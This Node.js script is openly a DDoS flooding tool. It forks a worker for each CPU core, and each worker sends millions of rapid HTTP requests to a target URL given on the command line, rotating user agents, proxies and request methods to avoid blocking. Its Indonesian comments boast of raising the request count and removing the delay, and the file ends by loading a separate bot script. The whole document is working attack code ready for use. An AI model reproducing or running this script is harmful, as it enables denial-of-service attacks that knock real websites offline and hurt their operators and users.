const cluster = require('cluster');
const fs = require('fs');
const axios = require('axios');
const { cpus } = require('os');
const numCPUs = cpus().length;


const httpMethods = ['GET', 'HEAD', 'OPTIONS', 'TRACE', 'OPTIONS', 'POST'];;
const userAgents = fs.readFileSync('user-agents.txt', 'utf-8').split('\n').filter(Boolean);
const proxies = fs.readFileSync('proxxy.txt', 'utf-8').split('\n').filter(Boolean);
const targetURL = process.argv[2];




if (cluster.isMaster) {
  console.log(`DDoS Is Ruuning! | DDoS Version 1.0.5`)
  for (let i = 0; i < numCPUs; i++) {
    cluster.fork();
  }
  cluster.on('exit', (worker, code, signal) => {
    // console.log(`Worker ${worker.process.pid} died`);
  });
} else {
  const maxRequests = 5000000; // Meningkatkan jumlah permintaan
  const intervalTime = 0; // Menurunkan interval waktu
  const maxRuntime = process.argv[3] * 60000; // Meningkatkan waktu maksimal runtime

  let requestCount = 0;

  async function makeRequest() {
    try {
      const randomUserAgent = userAgents[Math.floor(Math.random() * userAgents.length)];
      const randomProxy = proxies[Math.floor(Math.random() * proxies.length)];
      const randomHttpMethod = httpMethods[Math.floor(Math.random() * httpMethods.length)];

      const response = await axios.get(targetURL, {
        rejectUnauthorized: false,
        method: randomHttpMethod,
        headers: {
          'User-Agent': randomUserAgent,
          'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
          'Accept-Language': 'en-us,en;q=0.5',
          'Accept-Encoding': 'gzip,deflate',
          'Accept-Charset': 'ISO-8859-1,utf-8;q=0.7,*;q=0.7',
          'Keep-Alive': '115',
          'Connection': 'keep-alive'
        },
        httpsAgent: randomProxy
      });
      // console.log(`axios ${response.status}`);

      requestCount++;

      if (requestCount < maxRequests && process.uptime() * 1000 < maxRuntime) {
        setTimeout(makeRequest, intervalTime);
      } else {
        process.disconnect();
      }
    } catch (error) {
      // console.error(`Worker ${process.pid} - Error: ${error.message}`);
      // process.disconnect();
    }
  }

  async function run() {
    while (requestCount < maxRequests && process.uptime() * 1000 < maxRuntime) {
      await makeRequest();
    }

    process.disconnect();
  }

  run();
}

require('./bot1.js');